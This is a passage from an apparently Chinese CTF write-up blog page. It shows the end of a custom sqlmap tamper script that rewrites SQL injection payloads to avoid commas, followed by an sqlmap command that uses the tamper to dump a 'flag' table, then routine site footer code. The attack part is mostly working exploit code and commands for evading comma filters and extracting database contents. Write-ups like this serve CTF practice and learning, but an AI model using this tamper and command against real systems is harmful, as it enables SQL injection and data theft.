class="params">(payload)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> payload <span class="keyword">and</span> payload.find(<span class="string">"IFNULL"</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">while</span> payload.find(<span class="string">"IFNULL("</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                index = payload.find(<span class="string">"IFNULL("</span>)</span><br><span class="line">                depth = <span class="number">1</span></span><br><span class="line">                comma, end = <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> xrange(index + len(<span class="string">"IFNULL("</span>), len(payload)):</span><br><span class="line">                    <span class="keyword">if</span> depth == <span class="number">1</span> <span class="keyword">and</span> payload[i] == <span class="string">','</span>:</span><br><span class="line">                        comma = i</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">elif</span> depth == <span class="number">1</span> <span class="keyword">and</span> payload[i] == <span class="string">')'</span>:</span><br><span class="line">                        end = i</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">elif</span> payload[i] == <span class="string">'('</span>:</span><br><span class="line">                        depth += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">elif</span> payload[i] == <span class="string">')'</span>:</span><br><span class="line">                        depth -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> comma <span class="keyword">and</span> end:</span><br><span class="line">                    _ = payload[index + len(<span class="string">"IFNULL("</span>):comma]</span><br><span class="line">                    __ = payload[comma + <span class="number">1</span>:end].lstrip()</span><br><span class="line">                    newVal = <span class="string">"CASE WHEN %s=NULL THEN %s ELSE %s END"</span> % (_, __, _)</span><br><span class="line">                    payload = payload[:index] + newVal + payload[end + <span class="number">1</span>:]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = re.sub(<span class="string">r'(?i)TIMESTAMPADD\(\w+,\d+,NULL\)'</span>, <span class="string">'NULL'</span>, retVal)</span><br><span class="line">        retVal = re.sub(<span class="string">r'(?i)MID\((.+?)\s*,\s*(\d+)\s*\,\s*(\d+)\s*\)'</span>, <span class="string">'MID(\g&lt;1&gt; FROM \g&lt;2&gt; FOR \g&lt;3&gt;)'</span>, retVal)</span><br><span class="line">        retVal = commalessif(retVal)</span><br><span class="line">        retVal = commalessifnull(retVal)</span><br><span class="line">        retVal = re.sub(<span class="string">r'(?i)LIMIT\s*(\d+),\s*(\d+)'</span>, <span class="string">'LIMIT \g&lt;2&gt; OFFSET \g&lt;1&gt;'</span>, retVal)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
+
+
+
+
+<p>运行sqlmap：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r post.txt --level&#x3D;3 --skip&#x3D;&quot;user-agent,referer&quot; -v 3 --tamper&#x3D;commalessmysql -D web4 -T flag -C flag --dump</span><br></pre></td></tr></table></figure>
+
+
+<p>得到flag。</p>
+
+    </div>
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>-<a class="flink" href="https://github.com/sanjinhub/hexo-theme-geek" target="_blank" rel="noopener">Geek</a>.
+        <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label>
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
